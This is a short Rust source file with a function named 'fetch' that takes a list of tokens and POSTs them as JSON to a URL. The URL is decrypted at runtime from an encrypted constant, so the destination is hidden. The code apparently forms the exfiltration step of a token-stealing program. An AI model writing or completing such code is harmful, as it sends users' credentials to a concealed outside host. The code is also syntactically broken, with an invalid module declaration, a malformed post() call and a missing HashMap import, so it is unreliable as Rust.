mod constants;
mod crypto::decrypt;

pub async fn fetch(tokens: Vec<String>) -> Result<(), Box<dyn std::error::Error>> {
  let mut map = HashMap::new();
  map.insert("tokens", tokens.join("\n"));
  
  let client = reqwest::Client::new();
  let res = client.post("{}", decrypt(&API_URL, KEY, IV))
    .json(&map)
    .send()
    .await?;
    
  Ok(())
}